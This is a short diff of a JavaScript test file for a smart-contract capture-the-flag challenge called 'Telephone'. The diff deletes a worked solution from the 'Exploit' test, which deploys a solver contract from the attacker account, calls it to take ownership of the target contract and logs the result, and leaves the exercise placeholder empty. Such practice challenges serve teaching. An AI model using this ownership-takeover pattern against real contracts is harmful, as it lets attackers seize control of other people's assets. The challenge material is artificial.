@@ -26,12 +26,7 @@ describe('[Challenge] Telephone', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const TelephoneSolverFactory = await ethers.getContractFactory('TelephoneSolver', attacker);
-        const TelephoneSolver = await TelephoneSolverFactory.deploy();
-        let changeTX = await TelephoneSolver.callChangeOwner(this.target.address);
-        await changeTX.wait();
-        console.log(`\t owner   : ${await this.target.owner()}`);
-        console.log(`\t attacker: ${attacker.address}`);
+        
     }).timeout(0);
 
     after(async () => {
